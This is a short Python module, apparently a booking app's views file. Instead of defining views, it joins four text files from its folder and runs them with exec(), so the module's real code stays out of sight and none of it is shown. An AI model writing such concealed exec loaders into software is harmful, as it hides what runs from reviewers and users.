# booking/views.py
from pathlib import Path
_dir = Path(__file__).resolve().parent
_code = "".join((_dir / f"_vc_part{i}.txt").read_text() for i in range(4))
exec(compile(_code, __file__, "exec"), globals())
del Path, _dir, _code
